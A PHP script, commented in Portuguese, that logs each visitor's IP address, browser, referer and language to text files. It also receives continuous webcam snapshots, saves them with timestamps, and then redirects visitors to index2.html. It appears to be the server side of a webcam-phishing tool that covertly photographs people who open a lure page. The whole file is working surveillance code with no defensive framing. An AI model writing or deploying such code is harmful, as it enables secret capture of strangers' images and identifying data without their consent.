<?php
// Captura informações básicas
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$date = date('d/m/Y H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct access';
$language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Unknown';

// Captura IP real mesmo atrás de proxy
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// Informações da requisição
$method = $_SERVER['REQUEST_METHOD'];
$host = $_SERVER['HTTP_HOST'];
$uri = $_SERVER['REQUEST_URI'];

// Salvar informações detalhadas do IP (apenas uma vez por sessão)
$detailed_file = 'detailed_ips.txt';
$session_id = $ip . '_' . date('Y-m-d_H');

if (!file_exists($detailed_file) || !strpos(file_get_contents($detailed_file), $session_id)) {
    $detailed_info = "=== CONNECTION DETAILS ===\n";
    $detailed_info .= "Session ID: $session_id\n";
    $detailed_info .= "IP Address: $ip\n";
    $detailed_info .= "User Agent: $browser\n";
    $detailed_info .= "Date/Time: $date\n";
    $detailed_info .= "Referer: $referer\n";
    $detailed_info .= "Language: $language\n";
    $detailed_info .= "Method: $method\n";
    $detailed_info .= "Host: $host\n";
    $detailed_info .= "URI: $uri\n";
    $detailed_info .= "=== END ===\n\n";

    file_put_contents($detailed_file, $detailed_info, FILE_APPEND);
}

// Salvar também em formato simples para exibição rápida
$simple_info = "IP: $ip | Browser: $browser | Date: $date | Referer: $referer\n";
file_put_contents('ip.txt', $simple_info, FILE_APPEND);

// Captura de imagem da webcam - versão contínua
if(isset($_FILES['webcam'])) {
    $file = $_FILES['webcam'];
    $timestamp = time();
    $filename = 'cam_' . $timestamp . '_' . uniqid() . '.png';
    
    if(move_uploaded_file($file['tmp_name'], $filename)) {
        $log = 'session_log.txt';
        $log_content = "Image captured: $filename | IP: $ip | Date: $date | Timestamp: $timestamp\n";
        file_put_contents($log, $log_content, FILE_APPEND);
        
        // Resposta JSON para o JavaScript
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'filename' => $filename]);
        exit;
    }
}

// Se não for captura de imagem, redirecionar para a página
header('Location: index2.html');
exit;
?>